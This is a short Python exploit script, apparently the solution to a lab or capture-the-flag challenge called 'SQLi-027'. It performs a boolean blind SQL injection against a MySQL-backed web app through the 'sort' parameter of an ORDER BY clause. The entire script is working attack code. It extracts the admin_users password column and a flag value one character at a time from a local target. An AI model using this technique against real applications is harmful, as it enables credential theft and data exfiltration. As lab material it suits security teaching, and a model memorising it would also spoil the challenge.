#!/usr/bin/env python3
"""SQLi-027: MySQL Boolean Blind via ORDER BY Exploit"""
import requests
import string
import re

BASE_URL = "http://localhost:5027"
CHARSET = string.ascii_letters + string.digits + "_{}"

def check(condition):
    url = f"{BASE_URL}/products?sort=(CASE WHEN ({condition}) THEN price ELSE name END)"
    r = requests.get(url, timeout=10)
    # When TRUE: sorted by price, USB Hub ($29.99) is first
    products = re.findall(r'class="name">([^<]+)', r.text)
    return products and products[0] == "USB Hub"

def extract(table, column, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            cond = f"(SELECT SUBSTRING({column},{pos},1) FROM {table} LIMIT 1)='{c}'"
            if check(cond):
                result += c
                print(f"[+] {column}: {result}")
                found = True
                break
        if not found:
            break
    return result

def main():
    print("SQLi-027: MySQL ORDER BY Blind Exploit")
    print("=" * 40)
    extract("admin_users", "password")
    flag = extract("flags", "value")
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
